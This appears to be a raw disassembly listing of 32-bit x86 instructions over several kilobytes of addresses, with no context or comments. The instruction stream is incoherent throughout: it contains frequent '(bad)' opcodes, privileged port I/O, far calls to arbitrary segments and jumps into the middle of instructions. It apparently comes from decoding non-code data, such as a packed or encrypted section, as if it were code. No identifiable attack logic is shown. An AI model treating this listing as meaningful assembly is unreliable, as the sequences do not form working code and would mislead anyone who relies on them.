  491edf:	mov    al,ds:0x8a6e495
  491ee4:	push   esi
  491ee5:	inc    eax
  491ee6:	fwait
  491ee7:	aad    0x1a
  491ee9:	sti    
  491eea:	or     edi,ebx
  491eec:	add    al,0x3c
  491eee:	dec    edi
  491eef:	pusha  
  491ef0:	sti    
  491ef1:	mov    edx,0x60941684
  491ef6:	pusha  
  491ef7:	cs jne 0x491f38
  491efa:	sbb    dh,BYTE PTR [esp+esi*2]
  491efd:	test   DWORD PTR [ebp+0x64],0x6447c7d0
  491f04:	mov    WORD PTR [ebx+eiz*1-0x109763d4],cs
  491f0b:	imul   esp,DWORD PTR [esi],0x6c1070e1
  491f11:	add    ebx,DWORD PTR ds:0x9b13307f
  491f17:	cmp    DWORD PTR [ebp+0x19],edi
  491f1a:	add    ah,BYTE PTR [eax-0x76a3a875]
  491f20:	sbb    BYTE PTR [eax+0x1144c49a],bh
  491f26:	xor    bl,ah
  491f28:	jmp    0x491f07
  491f2a:	inc    ebx
  491f2b:	ja     0x491f57
  491f2d:	push   ds
  491f2e:	xchg   ebx,eax
  491f2f:	push   es
  491f30:	xchg   ebp,eax
  491f31:	jne    0x491f40
  491f33:	xchg   DWORD PTR [edi],ebx
  491f35:	add    cl,BYTE PTR [esp+ebp*2+0x536462bc]
  491f3c:	cmp    ah,al
  491f3e:	pop    ecx
  491f3f:	jmp    0x491f5a
  491f41:	xchg   esp,eax
  491f42:	fwait
  491f43:	ror    BYTE PTR [ecx+0x30],0x52
  491f47:	loopne 0x491ed9
  491f49:	or     BYTE PTR [esi-0x5c],bl
  491f4c:	xchg   esi,eax
  491f4d:	add    BYTE PTR [edi],dh
  491f4f:	sub    eax,0x30204369
  491f54:	push   esi
  491f55:	daa    
  491f56:	push   es
  491f57:	adc    al,0xd0
  491f59:	sbb    al,0xc7
  491f5b:	inc    edx
  491f5c:	test   al,0x64
  491f5e:	adc    ecx,DWORD PTR [ecx]
  491f60:	cmp    BYTE PTR [ebx],al
  491f62:	lahf   
  491f63:	mov    esp,0x3c1ceb55
  491f68:	push   esi
  491f69:	mov    eax,0xba061c80
  491f6e:	es push eax
  491f70:	mov    esi,0xa43b5709
  491f75:	sar    BYTE PTR [ebp-0x77b4fdfe],cl
  491f7b:	mov    BYTE PTR [ebp-0x5574e6ca],ch
  491f81:	push   DWORD PTR [edi-0x46292456]
  491f87:	pop    ss
  491f88:	or     eax,0x42178789
  491f8d:	sbb    ah,BYTE PTR [ecx-0x7a]
  491f90:	mov    al,0x94
  491f92:	jb     0x491f7a
  491f94:	xor    DWORD PTR [edx+0x65],0xd17f1614
  491f9b:	je     0x491f79
  491f9d:	inc    eax
  491f9e:	loope  0x491f7a
  491fa0:	or     DWORD PTR [eax+0x673881c1],edi
  491fa6:	adc    al,0xee
  491fa8:	sub    BYTE PTR [edi-0x3c2dcc11],bh
  491fae:	dec    eax
  491faf:	sbb    BYTE PTR [ecx+eax*4+0x58],al
  491fb3:	clc    
  491fb4:	sete   dl
  491fb7:	mov    eax,edx
  491fb9:	popa   
  491fba:	jae    0x491fe8
  491fbc:	push   esp
  491fbd:	pop    edx
  491fbe:	jbe    0x492008
  491fc0:	bound  ebx,QWORD PTR [eax]
  491fc2:	inc    ecx
  491fc3:	dec    esi
  491fc4:	inc    ebx
  491fc5:	mov    dh,0xb9
  491fc7:	dec    esp
  491fc8:	or     dh,BYTE PTR [ecx+0x6]
  491fcb:	data16 in al,dx
  491fcd:	sub    BYTE PTR [ecx+0x1808d0f4],cl
  491fd3:	(bad)  
  491fd4:	or     al,BYTE PTR [edi]
  491fd6:	mov    al,ds:0x4cfa432e
  491fdb:	or     DWORD PTR [edx+ebp*1-0x26],ecx
  491fdf:	popa   
  491fe0:	pusha  
  491fe1:	add    ebx,ecx
  491fe3:	jbe    0x491fef
  491fe5:	inc    edx
  491fe6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  491fe7:	sub    BYTE PTR [ebp-0x31f65cd1],al
  491fed:	call   0x3f8f2461
  491ff2:	mov    bh,bh
  491ff4:	push   0xfffffffe
  491ff6:	push   0x9c2094f8
  491ffb:	add    al,0xfd
  491ffd:	pop    ss
  491ffe:	mov    eax,ds:0x27330d5
  492003:	pop    edi
  492004:	cmp    eax,0x9ee0f801
  492009:	xchg   BYTE PTR [edx],dl
  49200b:	fisttp DWORD PTR [ecx+0xf2e13ff]
  492011:	and    DWORD PTR [ebx-0x238a2f72],0x14f30e54
  49201b:	push   cs
  49201c:	cs sub eax,0x1c76334f
  492022:	clc    
  492023:	stos   BYTE PTR es:[edi],al
  492024:	pop    ss
  492025:	and    dl,BYTE PTR [ecx-0x3edb71c6]
  49202b:	call   0xb071174f
  492030:	ret    0x6261
  492033:	in     al,dx
  492034:	jecxz  0x49209d
  492036:	inc    edi
  492037:	loope  0x49204a
  492039:	pop    eax
  49203a:	test   eax,0x11053eef
  49203f:	or     al,0x54
  492041:	cli    
  492042:	shl    BYTE PTR ds:0xf30eaac1,0xd7
  492049:	je     0x4920ac
  49204b:	outs   dx,BYTE PTR ds:[esi]
  49204c:	cld    
  49204d:	into   
  49204e:	pusha  
  49204f:	ja     0x492082
  492051:	or     BYTE PTR [ebx],bh
  492053:	or     al,0xc5
  492055:	pusha  
  492056:	aaa    
  492057:	jo     0x492057
  492059:	jo     0x491ffe
  49205b:	test   DWORD PTR [edx],ecx
  49205d:	mov    ah,0x16
  49205f:	jb     0x49204f
  492061:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  492062:	add    al,0xc5
  492064:	fs add al,0xe4
  492067:	push   eax
  492068:	loop   0x49208e
  49206a:	dec    edi
  49206b:	cld    
  49206c:	add    DWORD PTR [ebx+0x35274015],ebx
  492072:	push   esi
  492073:	pusha  
  492074:	ja     0x49209e
  492076:	fistp  DWORD PTR [ecx-0x12]
  492079:	pop    ecx
  49207a:	add    dh,ch
  49207c:	mov    DWORD PTR [ebp+0x6cc0cc04],edi
  492082:	push   eax
  492083:	in     eax,dx
  492084:	rol    ah,cl
  492086:	lahf   
  492087:	pop    ds
  492088:	bnd jns 0x4920e4
  49208b:	addr16 and ecx,ebp
  49208e:	cdq    
  49208f:	ja     0x4920f4
  492091:	out    dx,al
  492092:	or     eax,0x30d83d83
  492097:	out    dx,al
  492098:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  492099:	add    DWORD PTR [eax],edi
  49209b:	jl     0x492119
  49209d:	(bad)  
  49209e:	adc    eax,0x7120fc9d
  4920a3:	clc    
  4920a4:	push   0xb088389c
  4920a9:	mov    edi,0x45591840
  4920ae:	jl     0x492072
  4920b0:	push   edi
  4920b1:	fisttp WORD PTR ss:[esi]
  4920b4:	mov    eax,0x5017bff1
  4920b9:	idiv   DWORD PTR [esi+0x53563472]
  4920bf:	mov    ds:0x90496a7a,ax
  4920c5:	sbb    BYTE PTR [edi-0x44422ea],ah
  4920cb:	dec    esp
  4920cc:	pushf  
  4920cd:	es mov eax,0x6c68501f
  4920d3:	xor    BYTE PTR [edi+ebp*2],0x74
  4920d7:	or     al,0x5e
  4920d9:	push   eax
  4920da:	cwde   
  4920db:	inc    edx
  4920dc:	aad    0xcf
  4920de:	pop    ss
  4920df:	inc    eax
  4920e0:	mov    BYTE PTR [edx+0x3c2a0fb3],0x76
  4920e7:	sub    bl,BYTE PTR [ecx]
  4920e9:	lea    eax,[esi+edx*4]
  4920ec:	addr16 dec ecx
  4920ee:	clc    
  4920ef:	mov    ebp,0xce9e50e0
  4920f4:	inc    esp
  4920f5:	sar    ecx,1
  4920f7:	push   0xd92b8064
  4920fc:	push   ebx
  4920fd:	cmp    eax,edi
  4920ff:	cdq    
  492100:	(bad)  
  492101:	xor    al,0x8e
  492103:	sub    al,0xaa
  492105:	mov    ebp,0xbe2c5c68
  49210a:	push   es
  49210b:	mov    edi,0x2556506c
  492110:	repnz add al,0x75
  492113:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  492114:	push   DWORD PTR [ebp-0x767661b]
  49211a:	pusha  
  49211b:	daa    
  49211c:	xchg   ecx,eax
  49211d:	push   0x70082810
  492122:	lahf   
  492123:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  492124:	frstor [eax+0x2d]
  492127:	lock cwde 
  492129:	add    bl,BYTE PTR [esi+0x53]
  49212c:	add    eax,esi
  49212e:	and    ebx,esp
  492130:	pop    es
  492131:	push   esp
  492132:	js     0x492147
  492134:	push   0xfffffff4
  492136:	dec    ebp
  492137:	ror    BYTE PTR [ebp+0x38],0x82
  49213b:	xor    al,0x74
  49213d:	dec    esi
  49213e:	push   DWORD PTR [ecx+eax*2-0x4b]
  492142:	jne    0x492103
  492144:	adc    eax,ecx
  492146:	or     al,0x47
  492148:	mov    BYTE PTR [ebp+eax*1+0x1d869608],cl
  49214f:	imul   esp,DWORD PTR [eax+0x55],0x47
  492153:	push   esi
  492154:	inc    eax
  492155:	cmp    eax,0x553daaa
  49215a:	inc    eax
  49215b:	imul   ebx,ebp,0x50c1858d
  492161:	or     al,0x8
  492163:	ins    DWORD PTR es:[edi],dx
  492164:	pop    eax
  492165:	inc    ebx
  492166:	cwde   
  492167:	jbe    0x49212a
  492169:	pop    ecx
  49216a:	and    DWORD PTR [esi-0x6a],edx
  49216d:	mov    eax,0x9c00c486
  492172:	and    ebx,ebp
  492174:	cmc    
  492175:	lock leave 
  492177:	xor    eax,0xed15749c
  49217c:	pop    ds
  49217d:	jne    0x492195
  49217f:	push   0xe08adc2d
  492184:	jecxz  0x49217d
  492186:	adc    cl,BYTE PTR [ecx]
  492188:	int    0x20
  49218a:	pop    esi
  49218b:	inc    esp
  49218c:	pxor   xmm0,xmm0
  492190:	hlt    
  492191:	rol    edi,0x42
  492194:	add    BYTE PTR [ebx],bh
  492196:	fwait
  492197:	jne    0x492218
  492199:	push   es
  49219a:	loop   0x49221b
  49219c:	out    0xbe,al
  49219e:	scas   eax,DWORD PTR es:[edi]
  49219f:	xor    al,0x74
  4921a1:	pop    es
  4921a2:	je     0x4921db
  4921a4:	jae    0x4921b5
  4921a6:	jg     0x4921a9
  4921a8:	push   es
  4921a9:	inc    ecx
  4921aa:	adc    BYTE PTR [edi-0x7e],cl
  4921ad:	push   edx
  4921ae:	jmp    0x427941bc
  4921b3:	inc    ecx
  4921b4:	adc    bh,BYTE PTR [esi-0x2]
  4921b7:	cmp    al,0x41
  4921b9:	inc    ecx
  4921ba:	jo     0x492149
  4921bc:	mov    DWORD PTR [eax+0x75],ecx
  4921bf:	shl    BYTE PTR [eax],1
  4921c1:	sbb    al,0x30
  4921c3:	imul   esp,DWORD PTR [edi+esi*1],0xffffff88
  4921c7:	xor    BYTE PTR [ebx+edi*4],0xb5
  4921cb:	test   dh,0x72
  4921ce:	jg     0x4921dc
  4921d0:	adc    BYTE PTR [edx],dh
  4921d2:	div    BYTE PTR [eax+0x341c740f]
  4921d8:	or     dh,BYTE PTR [esi-0x3e95f120]
  4921de:	jmp    0xed2a:0x1989dc02
  4921e5:	sub    eax,DWORD PTR [ebp-0x2d077fbe]
  4921eb:	je     0x4921f3
  4921ed:	mov    BYTE PTR [ecx],bl
  4921ef:	inc    ecx
  4921f0:	inc    eax
  4921f1:	cli    
  4921f2:	pop    ss
  4921f3:	call   0xd8ea:0x585bc775
  4921fa:	neg    ebx
  4921fc:	cli    
  4921fd:	sub    ecx,DWORD PTR [esi+0x767736e9]
  492203:	push   edx
  492204:	mov    edx,ebx
  492206:	bound  esi,QWORD PTR [edi]
  492208:	add    DWORD PTR [ecx+0x4a],eax
  49220b:	shr    ebx,0x67
  49220e:	add    edx,eax
  492210:	sub    eax,DWORD PTR [ebx]
  492212:	out    0x4b,al
  492214:	mov    al,ds:0x12424579
  492219:	add    DWORD PTR [edx+0x3f],0x34
  49221d:	sbb    eax,0xba0b90d
  492222:	inc    esp
  492223:	push   cs
  492224:	fdiv   DWORD PTR [edx+0xc16e36e]
  49222a:	mov    cl,dh
  49222c:	cwde   
  49222d:	(bad)  
  49222e:	jmp    0x4921c0
  492230:	fisubr WORD PTR [eax+0x64b8f00e]
  492236:	not    DWORD PTR cs:[esi+0x38]
  49223a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49223b:	loopne 0x49224c
  49223d:	loop   0x49222a
  49223f:	inc    edi
  492240:	push   ss
  492241:	pop    esp
  492242:	push   edx
  492243:	mov    bl,0xff
  492245:	fistp  WORD PTR [ecx-0x162eb8ac]
  49224b:	rcr    ebx,1
  49224d:	shr    edx,1
  49224f:	rcr    eax,1
  492251:	or     ecx,ecx
  492253:	jne    0x492249
  492255:	div    ebx
  492257:	pop    esi
  492258:	dec    edx
  492259:	test   BYTE PTR [ebx+0x4214de6d],bh
  49225f:	inc    esp
  492260:	mul    esi
  492262:	pop    edx
  492263:	jb     0x492273
  492265:	cmp    ecx,DWORD PTR [esi+0x64]
  492268:	out    dx,eax
  492269:	outs   dx,DWORD PTR ds:[esi]
  49226a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49226b:	loop   0x49227c
  49226d:	cmp    edx,DWORD PTR [esi+0x76]
  492270:	or     DWORD PTR [esi+0x2b],ecx
  492273:	xor    BYTE PTR [ebx],bl
  492275:	and    al,0x12
  492277:	(bad)  
  492278:	cmp    al,0xb7
  49227a:	push   edx
  49227b:	adc    cl,BYTE PTR [eax]
  49227d:	or     al,0xf7
  49227f:	(bad)  
  492281:	fdiv   DWORD PTR [ebp+eax*1-0x3e]
  492285:	bound  eax,QWORD PTR [eax-0x75]
  492288:	retf   0xd918
  49228b:	iret   
  49228c:	pop    esi
  49228d:	inc    ebx
  49228e:	ret    0x12b
  492291:	pop    ss
  492292:	push   ecx
  492293:	push   ecx
  492294:	adc    ah,BYTE PTR [edx]
  492296:	fsub   st(2),st
  492298:	icebp  
  492299:	lahf   
  49229a:	add    cl,BYTE PTR [ecx-0x5b8a7dc8]
  4922a0:	push   ds
  4922a1:	jo     0x492316
  4922a3:	jl     0x4922f5
  4922a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4922a6:	or     al,0xde
  4922a8:	push   edx
  4922a9:	clc    
  4922aa:	stc    
  4922ab:	or     al,BYTE PTR [edx]
  4922ad:	jl     0x49228c
  4922af:	and    al,0x7f
  4922b1:	xlat   BYTE PTR ds:[ebx]
  4922b2:	cmp    eax,0x5b086a56
  4922b7:	jb     0x4922c4
  4922b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4922ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4922bb:	fmul   DWORD PTR [esi]
  4922bd:	sbb    BYTE PTR [ecx],0x1d
  4922c0:	(bad)
  4922c4:	data16 mov WORD PTR ds:0x37de6775,gs
  4922cb:	(bad)  
  4922cc:	dec    ebp
  4922cd:	adc    al,0x2
  4922cf:	jmp    0x4922d7
  4922d1:	push   ss
  4922d2:	sub    ecx,DWORD PTR [eax+0x44]
  4922d5:	mov    eax,gs:0x2df397b1
  4922db:	push   esi
  4922dc:	js     0x4922d0
  4922de:	mov    eax,0xf007c009
  4922e3:	inc    ebp
  4922e4:	adc    BYTE PTR [edx],cl
  4922e6:	push   ss
  4922e7:	ds pop ss
  4922e9:	adc    DWORD PTR [ebx],edi
  4922eb:	sar    bl,1
  4922ed:	js     0x4922f1
  4922ef:	clc    
  4922f0:	pop    eax
  4922f1:	inc    esi
  4922f2:	pop    ebp
  4922f3:	adc    bl,ch
  4922f5:	jnp    0x4922bf
  4922f7:	out    dx,eax
  4922f8:	mov    esp,0x6410342c
  4922fd:	adc    BYTE PTR [ebp+0x1f],dh
  492300:	jne    0x492316
  492302:	push   ebx
  492303:	add    ebp,0x750573d6
  492309:	dec    esi
  49230a:	ja     0x49230e
  49230c:	call   0x4a81:0x1e692f2c
  492313:	push   ebp
  492314:	pop    ds
  492315:	shl    dh,0x10
  492318:	add    dl,BYTE PTR [edi-0x4]
  49231b:	sub    ebx,ebx
  49231d:	or     eax,0x416afe0d
  492322:	pop    eax
  492323:	cmp    ax,si
  492326:	ja     0x492331
  492328:	pop    edx
  492329:	lea    eax,ss:[esi-0x61]
  49232d:	adc    al,bh
  49232f:	sbb    DWORD PTR [esi+0x77c9b37f],esi
  492335:	xor    DWORD PTR [edx+0x34],edi
  492338:	add    eax,DWORD PTR [ebx-0x3f7cdf18]
  49233e:	leave  
  49233f:	cmp    ebx,edx
  492341:	jae    0x49235d
  492343:	mov    ebp,0x600e00d8
  492348:	or     BYTE PTR [eax+0x5752a72],al
  49234e:	lods   al,BYTE PTR ds:[esi]
  49234f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  492350:	loopne 0x49230b
  492352:	push   ds
  492353:	clc    
  492354:	jbe    0x492379
  492356:	add    al,0x64
  492358:	or     al,0x25
  49235a:	fadd   DWORD PTR [edi+esi*8+0x2f]
  49235e:	out    dx,al
  49235f:	out    dx,eax
  492360:	add    ch,BYTE PTR [eax+0x1f267508]
  492366:	je     0x4923be
  492368:	jl     0x49231e
  49236a:	rcr    DWORD PTR [esi-0x1],0xeb
  49236e:	popa   
  49236f:	ror    BYTE PTR [edi],cl
  492371:	scas   eax,DWORD PTR es:[edi]
  492372:	dec    ebp
  492373:	push   0xffffffc8
  492375:	mov    DWORD PTR [edx+0x10e0e1f8],ecx
  49237b:	(bad)  
  49237c:	pop    esp
  49237d:	jnp    0x4923ea
  49237f:	mov    esi,0xe1351470
  492384:	retf   0xbca8
  492387:	test   al,0xb8
  492389:	cmp    eax,0x4b6208a
  49238e:	out    dx,al
  49238f:	cmp    al,0x9
  492391:	cmp    DWORD PTR [ebp+0x61],0xe8410977
  492398:	adc    al,0x8e
  49239a:	repnz div BYTE PTR [esi-0x1f]
  49239e:	and    edx,ecx
  4923a0:	jle    0x492349
  4923a2:	div    BYTE PTR [eax+0x43740b01]
  4923a8:	add    eax,0xfc5efdd2
  4923ad:	(bad)  
  4923ae:	jmp    0x4923bf
  4923b0:	and    ch,BYTE PTR [esi+0x591ac758]
  4923b6:	xor    BYTE PTR [esi+edx*4-0x2459a1de],ah
  4923bd:	pop    esp
  4923be:	mov    bl,BYTE PTR [ebx+0x3d]
  4923c1:	xor    esi,esp
  4923c3:	neg    DWORD PTR [ebp+0x26]
  4923c6:	mov    esp,0x5054d654
  4923cb:	sub    DWORD PTR [eax],edx
  4923cd:	ins    DWORD PTR es:[edi],dx
  4923ce:	cmp    edx,DWORD PTR [eax-0x6e85c6cc]
  4923d4:	sub    ah,BYTE PTR gs:[eax+0x23]
  4923d8:	xor    ecx,esi
  4923da:	lea    ecx,[ebp-0x30]
  4923dd:	das    
  4923de:	icebp  
  4923df:	outs   dx,DWORD PTR ds:[esi]
  4923e0:	ins    DWORD PTR es:[edi],dx
  4923e1:	jmp    0x492379
  4923e3:	push   eax
  4923e4:	xchg   esp,eax
  4923e5:	sbb    BYTE PTR [ebx],bh
  4923e7:	fnstenv [ebp+0x26]
  4923ea:	pop    eax
  4923eb:	sub    al,BYTE PTR [edi+0x23]
  4923ee:	jmp    0x30fdfccf
  4923f3:	jl     0x492455
  4923f5:	mov    al,ds:0x39117f92
  4923fa:	push   es
  4923fb:	out    dx,eax
  4923fc:	adc    al,0xb4
  4923fe:	or     BYTE PTR ds:0xee0acfd7,dl
  492404:	leave  
  492405:	xor    edx,DWORD PTR ss:[edi+0x9]
  492409:	push   ss
  49240a:	ja     0x49239e
  49240c:	cmp    esp,edi
  49240e:	lea    edi,[ebx-0x42]
  492411:	jmp    0x49241f
  492413:	xor    dl,BYTE PTR ds:0xff560e1d
  492419:	in     al,dx
  49241a:	sbb    dl,al
  49241c:	call   0xbfc0:0xb5b885b0
  492423:	push   ss
  492424:	sbb    BYTE PTR [ebp+ecx*1-0x25],dh
  492428:	adc    DWORD PTR [edi+ecx*1],esp
  49242b:	(bad)  
  49242c:	ror    bl,cl
  49242e:	lds    esi,FWORD PTR [ecx]
  492430:	mov    eax,0x3bce101e
  492435:	adc    al,0xa8
  492437:	jl     0x492420
  492439:	mov    bh,BYTE PTR ds:0x82b0ee7
  49243f:	daa    
  492440:	mov    esi,0x4ced8751
  492445:	adc    al,0x39
  492447:	add    al,0x39
  492449:	call   0x32d776e7
  49244e:	pop    esp
  49244f:	adc    al,0x6a
  492451:	sbb    al,BYTE PTR [edi]
  492453:	add    bl,BYTE PTR [esi+0x32]
  492456:	mov    WORD PTR [edi-0x27fbe84a],fs
  49245c:	dec    ebp
  49245d:	call   0xf49f15de
  492462:	jg     0x4923f2
  492464:	nop
  492465:	push   cs
  492466:	inc    edi
  492467:	jo     0x4924cd
  492469:	sti    
  49246a:	push   edx
  49246b:	sub    al,0x36
  49246d:	repz inc edx
  49246f:	lea    ebx,[eax-0xa]
  492472:	jae    0x4924af
  492474:	(bad)  
  492475:	push   esp
  492476:	ja     0x4923fb
  492478:	sbb    ah,cl
  49247a:	sbb    dh,ah
  49247c:	jb     0x4924cc
  49247e:	or     BYTE PTR [ebx],bl
  492480:	fcom   DWORD PTR [esi-0x6e]
  492483:	test   BYTE PTR [edx+esi*2+0x1dbe1944],ah
  49248a:	nop
  49248b:	in     al,0xac
  49248d:	jne    0x4924a2
  49248f:	sub    al,0x75
  492491:	push   cs
  492492:	xchg   esp,eax
  492493:	(bad)  
  492494:	fld    QWORD PTR ds:0x72ec26bd
  49249a:	xor    BYTE PTR [edi+0x3c],dh
  49249d:	call   0xa6a34e18
  4924a2:	add    DWORD PTR [esp+esi*1+0x183a10cd],ecx
  4924a9:	cmp    eax,DWORD PTR [ebp-0x1ad3c2bf]
  4924af:	test   eax,0x40e6160c
  4924b4:	add    eax,0x7ef087c4
  4924b9:	mov    esi,0x8def84e
  4924be:	jmp    0xf48616a3
  4924c3:	mov    dl,0x3
  4924c5:	ret    
  4924c6:	adc    edx,ecx
  4924c8:	(bad)  
  4924c9:	retf   
  4924ca:	jmp    0xd19e64b7
  4924cf:	jge    0x49246d
  4924d1:	mov    ebx,0x9e551fb3
  4924d6:	pminub mm4,QWORD PTR [edi]
  4924d9:	push   esp
  4924da:	or     eax,0x7219778a
  4924df:	adc    BYTE PTR [edi],cl
  4924e1:	mov    edi,0x77ae06a9
  4924e6:	adc    DWORD PTR [eax],esi
  4924e8:	ds nop
  4924ea:	cmp    ebp,esi
  4924ec:	push   ds
  4924ed:	fidivr DWORD PTR [ecx]
  4924ef:	ja     0x492512
  4924f1:	push   DWORD PTR [esi+0x31]
  4924f4:	repz sbb BYTE PTR [ebx+0xa6661fb],ah
  4924fb:	sub    al,0xfb
  4924fd:	push   ss
  4924fe:	sub    bl,BYTE PTR [eax-0x1f]
  492501:	jbe    0x4924c6
  492503:	inc    esp
  492504:	mov    dh,0x6e
  492506:	sub    bl,0x7
  492509:	xor    DWORD PTR [edx-0x61daf0bb],edi
  49250f:	js     0x492516
  492511:	cmp    eax,0xfaf8da13
  492516:	mov    al,ds:0xcd1a819
  49251b:	push   cs
  49251c:	xor    esi,DWORD PTR [eax-0x66]
  49251f:	and    eax,0xb0c77918
  492524:	(bad)  
  492525:	dec    esp
  492526:	add    eax,0x186d1aeb
  49252b:	mov    ch,0x57
  49252d:	clc    
  49252e:	xchg   esi,eax
  49252f:	inc    esi
  492530:	cmp    eax,0x3d44e2d7
  492535:	mov    ds:0x5398350,al
  49253a:	jb     0x49252f
  49253c:	or     BYTE PTR [ebx+0x4c6870b4],ch
  492542:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  492543:	jmp    0x492546
  492545:	loop   0x4925c3
  492547:	ins    DWORD PTR es:[edi],dx
  492548:	cmp    DWORD PTR [edx-0x75],edx
  49254b:	sub    BYTE PTR [edi],bl
  49254d:	inc    ebx
  49254e:	ins    BYTE PTR es:[edi],dx
  49254f:	and    BYTE PTR [eax+0x48],ah
  492552:	mov    esi,0xc0197ecc
  492557:	aaa    
  492558:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  492559:	loopne 0x492578
  49255b:	jae    0x49254e
  49255d:	repnz or al,BYTE PTR [eax+0x10e004d8]
  492564:	jmp    0x492583
  492566:	or     esp,DWORD PTR [edi+0x10b0635]
  49256c:	or     cl,BYTE PTR [eax]
  49256e:	cmp    edi,ebx
  492570:	push   eax
  492571:	add    al,BYTE PTR [edx+0x2a2103a7]
  492577:	push   eax
  492578:	push   es
  492579:	dec    ecx
  49257a:	or     al,0x62
  49257c:	sti    
  49257d:	dec    ebp
  49257e:	or     al,0x23
  492580:	sar    edi,0x72
  492583:	rcl    bl,cl
  492585:	ret    0xdd22
  492588:	jb     0x4925bc
  49258a:	ret    
  49258b:	or     BYTE PTR [ebp+0x46],0xa8
  49258f:	or     BYTE PTR [ebx],0x9
  492592:	(bad)  
  492593:	mov    edi,0xadbe59c6
  492598:	xor    ch,0xa8
  49259b:	inc    eax
  49259c:	je     0x4925e7
  49259e:	and    al,0xc
  4925a0:	add    al,0x71
  4925a2:	jecxz  0x4925fc
  4925a4:	push   0x15
  4925a6:	mov    WORD PTR [esi],fs
  4925a8:	mov    WORD PTR [esi],ss
  4925aa:	xor    ch,BYTE PTR [eax-0x72da01f0]
  4925b0:	dec    ebx
  4925b1:	addr16 push edx
  4925b3:	loopne 0x4925b3
  4925b5:	mov    DWORD PTR [esi],ecx
  4925b7:	mov    DWORD PTR [esi-0x1f],eax
  4925ba:	out    dx,al
  4925bb:	xchg   ebp,eax
  4925bc:	in     al,0x99
  4925be:	es enter 0x1602,0x42
  4925c3:	add    al,al
  4925c5:	add    ebp,edx
  4925c7:	mov    al,ds:0x2c7562a9
  4925cc:	jae    0x4925b9
  4925ce:	push   es
  4925cf:	mov    al,0x7d
  4925d1:	cs or  al,0x17
  4925d4:	inc    eax
  4925d5:	and    al,0xe5
  4925d7:	shl    DWORD PTR [ecx+0x75],1
  4925da:	or     eax,0x48f6940a
  4925df:	lods   eax,DWORD PTR ds:[esi]
  4925e0:	sub    DWORD PTR [eax-0xa8212],esp
  4925e6:	pop    ecx
  4925e7:	int3   
  4925e8:	or     BYTE PTR [edi-0x46],dl
  4925eb:	and    BYTE PTR [eax],0xe2
  4925ee:	or     edi,DWORD PTR [edx]
  4925f0:	sbb    al,0x3e
  4925f2:	outs   dx,DWORD PTR ds:[esi]
  4925f3:	nop
  4925f4:	lock push bx
  4925f7:	into   
  4925f8:	sbb    BYTE PTR [ebx],ch
  4925fa:	clc    
  4925fb:	dec    ecx
  4925fc:	sub    al,0x3b
  4925fe:	sti    
  4925ff:	jle    0x49261e
  492601:	mov    DWORD PTR [eax+0x5057dea6],edi
  492607:	jne    0x4925f2
  492609:	cmp    eax,0x961da748
  49260e:	dec    ebp
  49260f:	jmp    0x7581:0xce79b420
  492616:	or     al,0xa8
  492618:	stc    
  492619:	call   0x4466d317
  49261e:	adc    edx,DWORD PTR [esi+0x5fa3c1f]
  492624:	idiv   DWORD PTR [edi]
  492626:	and    BYTE PTR ds:0x20049597,cl
  49262c:	je     0x492642
  49262e:	push   0x2
  492630:	push   ebx
  492631:	push   ebx
  492632:	push   ecx
  492633:	cmc    
  492634:	loopne 0x492673
  492636:	jmp    0x4926ad
  492638:	adc    eax,0xe698c223
  49263d:	and    eax,0x39228aea
  492642:	stos   BYTE PTR es:[edi],al
  492643:	add    BYTE PTR [edx],ah
  492645:	or     BYTE PTR [edx+ebp*2],bh
  492648:	loopne 0x4926ac
  49264a:	addr16 pop ebx
  49264c:	dec    eax
  49264d:	fnstsw WORD PTR [ecx]
  49264f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  492650:	into   
  492651:	lock adc BYTE PTR [esi+0x8eb4f66],dh
  492658:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  492659:	push   ss
  49265a:	sbb    BYTE PTR [edi-0x5ea4a0e5],ch
  492660:	mov    al,0x50
  492662:	pop    es
  492663:	test   al,0xac
  492665:	inc    eax
  492666:	mov    esp,0x501a5278
  49266b:	or     BYTE PTR [ebx-0x9b07c1a],0xb9
  492672:	popf   
  492673:	push   cs
  492674:	mov    BYTE PTR [edx],cl
  492676:	dec    eax
  492677:	and    BYTE PTR [esi+0xe],dl
  49267a:	mov    ds:0x760a2306,al
  49267f:	sub    bh,cl
  492681:	test   BYTE PTR [ebx+0x5e],0xe8
  492685:	mov    al,0x20
  492687:	popa   
  492688:	mov    eax,0xdde0b607
  49268d:	dec    ebx
  49268e:	or     bh,bl
  492690:	lock js 0x492709
  492693:	push   es
  492694:	jmp    0x4926d9
  492696:	and    DWORD PTR [edi],0x1
  492699:	inc    eax
  49269a:	add    BYTE PTR [edi+0x6b],ah
  49269d:	jle    0x4926d4
  49269f:	adc    edi,eax
  4926a1:	mov    ch,0x11
  4926a4:	nop
  4926a5:	mov    dh,0xc0
  4926a7:	ss clc 
  4926a9:	rcl    BYTE PTR [ebp+0x3ec546c0],0xff
  4926b0:	or     al,BYTE PTR [ebx-0x227fd5c1]
  4926b6:	lods   eax,DWORD PTR ds:[esi]
  4926b7:	add    BYTE PTR [eax+0x5f592f3f],bl
  4926bd:	jg     0x49268f
  4926bf:	sub    al,0xf8
  4926c1:	mov    ah,0x3e
  4926c3:	and    al,BYTE PTR ds:0x922b0772
  4926c9:	outs   dx,BYTE PTR ds:[esi]
  4926ca:	leave  
  4926cb:	dec    esi
  4926cc:	jle    0x492746
  4926ce:	add    al,0xa2
  4926d0:	arpl   WORD PTR ds:0x461fde40,bx
  4926d6:	jge    0x492714
  4926d8:	lods   al,BYTE PTR ds:[esi]
  4926d9:	in     al,dx
  4926da:	sahf   
  4926db:	cmc    
  4926dc:	lea    ecx,[ebp-0x23a10458]
  4926e2:	or     edi,DWORD PTR [ebp-0x34436220]
  4926e8:	in     eax,0x72
  4926ea:	mov    ecx,0xd8f4d0f8
